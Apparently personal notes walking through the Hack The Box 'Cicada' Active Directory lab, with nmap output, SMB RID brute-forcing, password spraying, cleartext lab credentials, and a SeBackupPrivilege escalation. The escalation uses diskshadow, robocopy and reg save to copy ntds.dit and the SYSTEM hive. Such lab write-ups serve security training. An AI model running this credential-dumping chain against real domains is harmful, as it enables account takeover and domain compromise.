nmap
```
┌──(kali㉿kali)-[~/HTB/cicada-AD]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.86.108                          
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 22:16 EST
Nmap scan report for 10.129.86.108
Host is up (0.045s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-22 10:18:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
60942/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-22T10:19:01
|_  start_date: N/A
|_clock-skew: 6h59m59s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   42.67 ms 10.10.14.1
2   43.19 ms 10.129.86.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.50 seconds
```

![Pasted image 20250122120927](<0. Attachments/Pasted image 20250122120927.png>)

![Pasted image 20250122121443](<0. Attachments/Pasted image 20250122121443.png>)

![Pasted image 20250122121741](<0. Attachments/Pasted image 20250122121741.png>)

![Pasted image 20250122121651](<0. Attachments/Pasted image 20250122121651.png>)
retrieved Password - Cicada$M6Corpb*@Lp#nZp!8

another way to check shares
![Pasted image 20250122122240](<0. Attachments/Pasted image 20250122122240.png>)

to find possible users
```
sudo nxc smb 10.129.86.108 -u guest -p '' --rid-brute
```
![Pasted image 20250122122536](<0. Attachments/Pasted image 20250122122536.png>)

finding the correct username
```
sudo nxc smb 10.129.86.108 -u user.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![Pasted image 20250122123026](<0. Attachments/Pasted image 20250122123026.png>)

we can do a ldapdomaindump
![Pasted image 20250122123232](<0. Attachments/Pasted image 20250122123232.png>)
```
ldapdomaindump 10.129.86.108 -u 'cicada\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
![Pasted image 20250122123423](<0. Attachments/Pasted image 20250122123423.png>)

new creds
david.orelious --> aRt$Lp#7t*VQ!3

![Pasted image 20250122123637](<0. Attachments/Pasted image 20250122123637.png>)

![Pasted image 20250122123940](<0. Attachments/Pasted image 20250122123940.png>)

more creds
![Pasted image 20250122124023](<0. Attachments/Pasted image 20250122124023.png>)`emily.oscars --> Q!3@Lp#M6b*7t*Vt`

checking shares
![Pasted image 20250122124322](<0. Attachments/Pasted image 20250122124322.png>)

![Pasted image 20250122154037](<0. Attachments/Pasted image 20250122154037.png>)

priv esc
[Windows Privilege Escalation: SeBackupPrivilege - Hacking Articles](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/?source=post_page-----f29a7a6bd355--------------------------------)

`unix2dos raj.dsh`
raj.dsh
```
nano raj.dsh
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```
commands
```
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
reg save hklm\system c:\tmp\system
```

![Pasted image 20250122160749](<0. Attachments/Pasted image 20250122160749.png>)

![Pasted image 20250122160817](<0. Attachments/Pasted image 20250122160817.png>)

![Pasted image 20250122161015](<0. Attachments/Pasted image 20250122161015.png>)

